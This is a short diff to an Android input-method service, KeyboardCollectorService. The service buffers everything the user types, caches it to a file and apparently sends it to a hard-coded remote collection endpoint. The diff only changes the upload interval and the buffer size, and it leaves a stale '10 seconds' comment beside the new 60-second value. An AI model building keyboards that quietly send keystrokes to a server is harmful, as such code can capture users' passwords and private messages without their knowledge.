@@ -20,12 +20,12 @@ import java.util.HashMap;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import hr.fer.R;
 import hr.fer.connection.PostDataToServer;
-import hr.fer.keyboard.R;
 
 public class KeyboardCollectorService extends  InputMethodService
         implements KeyboardView.OnKeyboardActionListener {
-    public static final long NOTIFY_INTERVAL = 10 * 1000; // 10 seconds
+    public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
     private final String PATH = "./cache.txt";
     private final String SERVER_PATH = "http://collector-env-1.2ta8wpyecx.us-east-2.elasticbeanstalk.com/keyboard/store";
     private File cache;
@@ -110,7 +110,7 @@ public class KeyboardCollectorService extends  InputMethodService
                 ic.commitText(String.valueOf(code), 1);
 
                 typedText.append(code);
-                if (typedText.length() == 10) {
+                if (typedText.length() == 100) {
                     try {
                         writeToCache(typedText.toString());
                     } catch (IOException e) {
